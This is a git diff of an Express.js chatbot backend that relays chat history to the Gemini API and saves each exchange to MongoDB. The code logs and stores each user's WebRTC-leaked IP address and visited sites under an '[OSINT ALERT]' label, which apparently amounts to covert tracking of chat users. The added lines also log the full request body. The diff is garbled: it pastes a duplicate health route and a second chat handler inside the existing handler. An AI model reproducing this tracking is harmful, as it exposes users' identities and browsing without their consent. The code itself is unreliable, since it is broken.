@@ -28,6 +28,28 @@ app.post('/api/chat', async (req, res) => {
     const { history, metadata } = req.body;
     const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
 
+    if (!GEMINI_API_KEY) {
+        console.error("CRITICAL: GEMINI_API_KEY is not defined in Render Environment Variables.");
+        return res.status(500).json({ error: "Server configuration error: API Key missing." });
+    }
+
+    console.log("[DEBUG] Datos recibidos:", req.body); // Debug as requested
+// Endpoint de salud (Healthcheck) para el Cron-job (Mantener vivo)
+app.get('/api/health', (req, res) => {
+    res.sendStatus(200); // Respuesta mínima y estándar
+});
+
+app.post('/api/chat', async (req, res) => {
+    const { history, metadata } = req.body;
+    const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
+
+    if (!GEMINI_API_KEY) {
+        console.error("CRITICAL: GEMINI_API_KEY is not defined in Render Environment Variables.");
+        return res.status(500).json({ error: "Server configuration error: API Key missing." });
+    }
+
+    console.log("[DEBUG] Datos recibidos:", req.body); // Debug como solicitado
+
     try {
         const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${GEMINI_API_KEY}`, {
             method: "POST",
@@ -50,15 +72,19 @@ app.post('/api/chat', async (req, res) => {
                 chat: history,
                 reply: reply
             };
-            
-            // Log en consola de Render
+
             console.log(`[OSINT ALERT] User: ${logEntry.userId} | WebRTC_IP: ${logEntry.ip_webrtc} | Sites: ${logEntry.visited_sites}`);
-            
-            await db.collection('chat_logs').insertOne(logEntry);
+
+            try {
+                await db.collection('chat_logs').insertOne(logEntry);
+            } catch (dbError) {
+                console.error("[MONGODB INSERTION ERROR]", dbError);
+            }
         }
 
         res.status(200).json({ reply: reply });
     } catch (error) {
+        console.error("[GEMINI/FETCH ERROR]", error);
         res.status(500).json({ error: 'Fallo en el núcleo.' });
     }
 });
